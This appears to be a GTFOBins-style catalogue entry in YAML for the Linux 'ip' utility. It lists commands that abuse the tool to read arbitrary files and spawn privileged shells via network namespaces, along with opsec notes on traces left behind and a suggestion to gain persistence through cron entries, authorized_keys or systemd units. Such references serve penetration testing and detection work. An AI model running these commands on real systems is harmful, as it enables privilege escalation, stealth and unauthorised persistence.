---
name: ip
capabilities:
- exec
- spawn
- read
required_permissions:
  level: user
difficulty: medium
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  notes: ''
persistence_potential: true
examples:
- id: file-read
  description: Read an arbitrary file.
  capabilities:
  - read
  command: ip -force -batch /path/to/input-file
  notes: The read file content is corrupted by error prints.
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: |-
    ip netns add foo
    ip netns exec foo /bin/sh -p
    ip netns delete foo
- id: shell-2
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: |-
    ip netns add foo
    ip netns exec foo /bin/ln -s /proc/1/ns/net /var/run/netns/bar
    ip netns exec bar /bin/sh
    ip netns delete foo
    ip netns delete bar
references:
- https://gtfobins.github.io/gtfobins/ip/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
